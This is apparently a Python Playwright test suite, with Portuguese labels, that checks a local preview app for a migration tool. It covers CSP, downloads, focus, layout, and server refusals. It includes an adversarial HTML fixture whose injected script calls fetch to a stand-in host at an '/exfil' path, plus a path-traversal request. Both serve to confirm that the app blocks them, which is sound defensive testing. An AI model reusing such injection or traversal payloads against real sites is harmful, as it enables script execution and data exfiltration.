import asyncio,json,tempfile,socket,os,subprocess,argparse
from pathlib import Path
from playwright.async_api import async_playwright
ROOT=Path(__file__).resolve().parents[1]
RESULTS=[]
def check(name,value):
 RESULTS.append({'name':name,'pass':bool(value)})
 if not value:raise AssertionError(name)
async def run(output,screenshot=None):
 sock=socket.socket();sock.bind(('127.0.0.1',0));port=sock.getsockname()[1];sock.close()
 server=subprocess.Popen(['node',str(ROOT/'tools/serve-preview.mjs')],env={**os.environ,'PORT':str(port)},stdout=subprocess.DEVNULL,stderr=subprocess.PIPE)
 base=f'http://127.0.0.1:{port}/';await asyncio.sleep(.2)
 try:
  async with async_playwright()as pw:
   browser=await pw.chromium.launch();context=await browser.new_context(viewport={'width':1536,'height':1024},accept_downloads=True);page=await context.new_page();errors=[];external=[]
   page.on('pageerror',lambda e:errors.append(str(e)))
   async def guard(route):
    if route.request.url.startswith(base):await route.continue_()
    else:external.append(route.request.url);await route.abort()
   await page.route('**/*',guard)
   response=await page.goto(base);check('HTTP inicial',response.status==200);check('MIME correto','text/html'in response.headers.get('content-type',''));check('CSP presente',"connect-src 'none'"in response.headers.get('content-security-policy',''))
   check('Candidato explícito',await page.get_by_text('CANDIDATO · F3 NÃO HOMOLOGADO').count()==1)
   check('Job inicialmente bloqueado',await page.get_by_role('button',name='Baixar job privado').is_disabled())
   await page.get_by_role('button',name='Carregar exemplo fictício').click();await page.get_by_role('button',name='Analisar',exact=True).click();await page.get_by_text('Diagnóstico concluído.',exact=False).wait_for()
   check('Exemplo mantém selo após análise',await page.get_by_text('EXEMPLO FICTÍCIO',exact=True).count()==1)
   check('Adaptador detectado',await page.get_by_text('atelie-source-map/1',exact=True).count()==1)
   check('Família por metadata',await page.get_by_text('2.0.0',exact=True).count()==1)
   await page.get_by_role('button',name='Ver plano',exact=True).click();check('Foco preservado ao inspecionar',await page.get_by_role('button',name='Ver plano',exact=True).evaluate('(e)=>document.activeElement===e'))
   check('Gates visíveis',await page.get_by_text('OFFICIAL_BUILD_NOT_EXECUTED',exact=True).count()==1)
   await page.get_by_role('checkbox').check();await page.get_by_role('button',name='Validar este plano local').click()
   async with page.expect_download()as info:await page.get_by_role('button',name='Baixar job privado').click()
   download=await info.value
   with tempfile.TemporaryDirectory()as temp:
    dest=Path(temp)/'job.json';await download.save_as(dest);job=json.loads(dest.read_text());check('Download de job real',job['schema']=='atelie-private-job/1');check('Job não transporta fontes',job['containsSourceContents']is False and 'EXEMPLO FICTÍCIO'not in dest.read_text());check('Job não autoriza publicação',job['publicationAuthorized']is False)
   await page.get_by_role('button',name='Fechar',exact=True).click();check('Foco ao fechar inspetor',await page.get_by_role('button',name='Mostrar inspeção').evaluate('(e)=>e===document.activeElement'))
   await page.get_by_role('button',name='Mostrar inspeção').click();check('Reabrir inspetor',await page.get_by_role('button',name='Fechar',exact=True).is_visible())
   await page.get_by_role('button',name='Carregar exemplo fictício').click();check('Alteração invalida aprovação',await page.get_by_role('button',name='Baixar job privado').is_disabled())
   await page.get_by_role('button',name='Limpar sessão').click();check('Limpeza da sessão',await page.locator('.f3-entry').count()==0)
   secret='PRIVADO_91C7D3C0';html=('<script>globalThis.IMPORTED_EXECUTED=1;fetch("https://invalid.example/exfil")<'+'/script><img src="https://invalid.example/a.png"><p>'+secret+'</p>')
   await page.locator('input[aria-label="Arquivos para diagnóstico"]').set_input_files({'name':'adversarial.html','mimeType':'text/html','buffer':html.encode()});await page.get_by_text('Clique em Analisar.',exact=False).wait_for();await page.get_by_role('button',name='Analisar',exact=True).click();await page.get_by_text('Diagnóstico concluído.',exact=False).wait_for()
   check('Legado não executado',await page.evaluate('globalThis.IMPORTED_EXECUTED===undefined'))
   check('Conteúdo privado não renderizado',secret not in await page.locator('body').inner_text());check('Sem requisições externas',not external)
   await page.locator('input[aria-label="Arquivos para diagnóstico"]').set_input_files({'name':'entrada.zip','mimeType':'application/zip','buffer':b'PKinvalid'});await page.get_by_text('ZIP não suportado',exact=False).wait_for();check('ZIP bloqueia sem extrair',await page.get_by_role('button',name='Baixar job privado').is_disabled())
   await page.set_viewport_size({'width':390,'height':844});check('Sem overflow horizontal móvel',await page.evaluate('document.documentElement.scrollWidth<=innerWidth'))
   await page.set_viewport_size({'width':768,'height':512});check('Reflow viewport equivalente a zoom200',await page.evaluate('document.documentElement.scrollWidth<=innerWidth'))
   await page.set_viewport_size({'width':1536,'height':1024});await page.get_by_role('button',name='Carregar exemplo fictício').click();await page.get_by_role('button',name='Analisar',exact=True).click();await page.get_by_text('Diagnóstico concluído.',exact=False).wait_for();check('Tela desktop cabe no quadro',await page.evaluate('document.body.scrollHeight<=innerHeight'))
   if screenshot:await page.screenshot(path=str(screenshot),full_page=False)
   check('Sem erro JavaScript',not errors)
   check('Cabeçalho Host estranho recusado',(await context.request.get(base,headers={'Host':'outro.invalid'})).status==403)
   check('Fonte/segredo não servido',(await context.request.get(base+'../packages/core/core.mjs')).status==404)
   check('POST recusado',(await context.request.post(base)).status==405)
   check('Arquivo de documentação não público',(await context.request.get(base+'HANDOFF.md')).status==404)
   await page.goto(base+'suite/');consoles=page.locator('atelie-f3-migrator');await consoles.nth(0).get_by_role('button',name='Carregar exemplo fictício').click();check('Duas instâncias isolam estado',await consoles.nth(0).locator('.f3-entry').count()==1 and await consoles.nth(1).locator('.f3-entry').count()==0)
   await context.close();file_context=await browser.new_context();file_page=await file_context.new_page();await file_page.goto((ROOT/'preview/index.html').resolve().as_uri());await file_page.get_by_role('button',name='Carregar exemplo fictício').click();await file_page.get_by_role('button',name='Analisar',exact=True).click();await file_page.get_by_text('Diagnóstico concluído.',exact=False).wait_for();check('Prévia file URL analisa em Chromium',await file_page.get_by_text('atelie-source-map/1',exact=True).count()==1);await browser.close()
 finally:server.terminate();server.wait(timeout=5)
 report={'suite':'auxiliary-preview-chromium','results':RESULTS,'passed':sum(r['pass']for r in RESULTS),'failed':sum(not r['pass']for r in RESULTS),'officialViteLitBuildTested':False,'fullWCAGAudit':False,'firefox':'not_available','webkit':'not_available'};Path(output).write_text(json.dumps(report,ensure_ascii=False,indent=2));return report
if __name__=='__main__':
 p=argparse.ArgumentParser();p.add_argument('--output',required=True);p.add_argument('--screenshot');a=p.parse_args();asyncio.run(run(a.output,a.screenshot))
